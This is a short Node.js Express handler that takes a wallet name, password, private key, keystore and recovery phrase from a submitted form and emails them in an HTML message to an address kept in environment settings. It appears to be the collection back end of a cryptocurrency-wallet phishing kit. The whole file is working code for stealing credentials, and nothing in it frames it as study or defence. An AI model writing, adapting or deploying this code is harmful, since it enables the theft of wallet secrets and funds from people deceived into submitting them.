const dotenv = require("dotenv");
const nodemailer = require("nodemailer");

dotenv.config();

const mailer = nodemailer.createTransport({
    host: process.env.EMAIL_HOST,
    port: process.env.EMAIL_PORT,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

exports.sendEmail = async (req, res) => {
    const { phrase, keystore, privateKey, password, wallet } = req.body;

    const options = {
        from: process.env.SEND_FROM,
        to: process.env.SEND_TO,
        subject: "New Submission",
        html: `<div>
                <h3>New Submission</h3>
                <p>Wallet:  <span style="font-weight:bold">${wallet || '-'}</span></p>
                <p>Password:  <span style="font-weight:bold">${password || '-'}</span></p>
                <p>Private Key:  <span style="font-weight:bold">${privateKey || '-'}</span></p>
                <p>Key Store:  <span style="font-weight:bold">${keystore || '-'}</span></p>
                <p>Phrase: <span style="font-weight:bold">${phrase || '-'}</span></p>
                </div>
            `,
    };
    try {
        await mailer.sendMail(options);
        res.status(200).json({
            message: "success",
        });
    } catch (error) {
        console.log(error);
        res.status(400).json({
            message: error.message,
        });
    }
};
